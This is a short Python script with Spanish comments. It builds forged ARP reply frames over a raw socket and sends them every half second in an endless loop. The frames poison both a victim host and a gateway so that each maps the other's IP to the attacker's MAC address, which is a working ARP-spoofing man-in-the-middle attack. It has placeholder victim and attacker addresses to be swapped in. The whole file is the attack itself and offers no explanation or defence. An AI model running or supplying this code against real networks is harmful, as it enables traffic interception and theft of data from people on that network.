import time
import socket

def doFrameARP(destination_mac, source_mac, sender_hardware, sender_ip, target_hardware, target_ip):	
	ether_type = '\x08\x06' # arp protocolo
	HTYPE = '\x00\x01' 
	PTYPE = '\x08\x00'
	HLEN = '\x06'
	PLEN = '\x04'
	operation = '\x00\x02'
	SHA = sender_hardware
	SPA = socket.inet_aton(sender_ip)
	THA = target_hardware
	TPA = socket.inet_aton(target_ip)
	
	return destination_mac + source_mac + ether_type + HTYPE + PTYPE + HLEN + PLEN + operation + SHA + SPA + THA + TPA
	       
	       
	       

#windows AF_INET
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800)) # creacion del socket
s.bind(("eth0",socket.htons(0x800)))

#### ARP


ip_server = '192.168.0.1' # ip del servidor como sender (cambiar)
ip_victim = '192.168.0.9' # ip de la victima (cambiar)
mac_victim = '\xc8\xff\x28\x63\x34\x79' # mac de la victima (cambiar)
mac_attacker = '\x08\x00\x27\xc0\xce\xd9' # mac del atacante (cambiar)

to_victim = doFrameARP(mac_victim, mac_attacker, mac_attacker, ip_server, mac_victim, ip_victim)

mac_server = '\x0c\x37\x47\xb1\x2a\xcc' # mac del servidor (cambiar)
to_server = doFrameARP(mac_server, mac_attacker, mac_attacker, ip_victim, mac_server, ip_server)


while True:
   s.send(to_victim)
   s.send(to_server)
   time.sleep(0.5)




